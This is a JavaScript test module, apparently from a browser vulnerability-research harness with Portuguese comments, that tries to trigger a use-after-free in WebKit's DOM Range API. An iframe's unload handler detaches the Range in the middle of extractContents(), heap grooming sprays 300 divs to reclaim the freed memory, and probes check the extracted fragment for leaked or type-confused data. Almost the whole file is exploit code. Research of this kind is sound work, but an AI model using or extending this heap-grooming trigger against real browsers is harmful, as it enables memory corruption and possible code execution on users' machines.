import { Groomer } from '../mod_groomer.js';

export default {
    id:       'DOM_RANGE_EXTRACT_UAF',
    category: 'DOM',
    risk:     'HIGH',
    description:
        'UAF na API de Range C++. Extrai um fragmento do DOM que contém um IFrame. ' +
        'O evento unload do IFrame é acionado síncronamente a meio da operação nativa ' +
        'e destrói o próprio Range. O C++ tenta terminar de mover os nós num Range morto.',

    setup: function() {
        this.results = {};
        this.sandbox = document.getElementById('groomer-sandbox');
        
        this.container = document.createElement('div');
        this.iframe = document.createElement('iframe');
        
        // Colocamos texto e um iframe dentro do mesmo alvo
        this.container.appendChild(document.createTextNode('ALVO_C++'));
        this.container.appendChild(this.iframe);
        this.sandbox.appendChild(this.container);
        
        // Criamos o Range que abrange tudo
        this.range = document.createRange();
        this.range.selectNodeContents(this.container);

        const self = this;
        // A ARMADILHA: O Range.extractContents() remove o IFrame do documento.
        // O WebKit dispara o unload IMEDIATAMENTE a meio da extração C++.
        this.iframe.contentWindow.onunload = function() {
            try {
                // O GATILHO: Destruímos a Range a partir do callback do filho!
                self.range.detach();
                
                // Inunda a RAM para sobrepor a classe Range C++ na memória
                let trash = Groomer.sprayDOM('div', 300);
            } catch(e) {}
        };
    },

    trigger: function() {
        try {
            // Inicia a extração síncrona
            this.results.fragment = this.range.extractContents();
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        s => s.results.error || 'Extração C++ Concluída',
        
        // Probe de LEAK / Type Confusion
        s => {
            if (s.results.fragment && s.results.fragment.childNodes.length > 0) {
                try {
                    let content = s.results.fragment.firstChild.nodeValue;
                    // Se a extração trouxe a memória corrompida em vez de 'ALVO_C++', apitamos
                    if (content !== 'ALVO_C++' && content !== null) {
                        return `💥 LEAK C++: Leu Memória Errada -> ${content}`;
                    }
                } catch(e) {}
            }
            return 0; // Seguro / Vazio
        }
    ],

    cleanup: function() {
        try { this.container.remove(); } catch(e){}
        this.range = null;
        this.container = null;
        this.iframe = null;
        this.results = {};
    }
};
